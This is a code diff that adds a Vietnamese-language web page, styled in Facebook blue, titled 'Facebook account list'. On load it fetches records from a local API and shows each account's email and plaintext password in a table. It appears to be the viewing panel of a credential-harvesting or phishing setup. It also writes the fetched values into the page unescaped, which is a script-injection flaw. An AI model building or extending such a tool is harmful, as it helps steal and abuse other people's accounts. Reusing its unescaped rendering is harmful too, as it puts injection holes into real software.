@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Danh sách tài khoản</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        table,
+        th,
+        td {
+            border: 1px solid black;
+        }
+
+        th,
+        td {
+            padding: 10px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #1877f2;
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Danh sách tài khoản Facebook</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Email</th>
+                <th>Password</th>
+            </tr>
+        </thead>
+        <tbody id="accountTableBody">
+            <!-- Dữ liệu sẽ được thêm vào đây -->
+        </tbody>
+    </table>
+
+    <script>
+        async function fetchAccounts() {
+            try {
+                const response = await fetch("http://localhost:5000/api/accounts");
+                const accounts = await response.json();
+
+                const tableBody = document.getElementById("accountTableBody");
+                tableBody.innerHTML = "";
+
+                accounts.forEach(account => {
+                    const row = `<tr>
+                        <td>${account.email}</td>
+                        <td>${account.password}</td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
+                });
+            } catch (error) {
+                console.error("Lỗi khi lấy dữ liệu:", error);
+            }
+        }
+
+        // Gọi API khi trang được load
+        window.onload = fetchAccounts;
+    </script>
+</body>
+
+</html>
